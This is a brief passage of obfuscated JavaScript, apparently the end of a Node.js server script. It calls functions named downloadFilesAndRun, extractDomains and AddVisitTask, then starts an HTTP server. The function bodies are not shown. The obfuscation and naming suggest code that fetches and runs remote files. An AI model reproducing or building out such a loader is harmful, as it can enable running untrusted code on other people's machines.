downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x72ebeb){console['error'](_0x4fade2(0x188),_0x72ebeb);}}startserver()[_0x3af801(0x18d)](_0x4c4c8e=>{const _0x4da947=_0x3af801;console[_0x4da947(0x19c)]('Unhandled\x20error\x20in\x20startserver:',_0x4c4c8e);}),app[_0x3af801(0x1e3)](PORT,()=>console[_0x3af801(0x1a8)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
